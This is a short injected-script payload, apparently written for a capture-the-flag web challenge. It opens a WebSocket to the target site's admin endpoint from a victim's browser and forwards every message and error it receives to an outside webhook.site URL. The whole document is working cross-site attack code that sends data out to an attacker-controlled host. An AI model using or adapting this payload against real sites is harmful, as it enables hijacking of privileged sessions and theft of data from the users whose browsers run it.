<script>
    try{
        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');
        ws.onopen = () => {
            fetch('https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=started');
            ws.send('Hello Server!');
        };

        ws.onmessage = (event) => {
            fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${event.data}`);
        };

        ws.onerror = (error) => {
            fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${error}`);
        };
    } catch (error) {
        fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${error.name + error.message}`);
    }
    
</script>
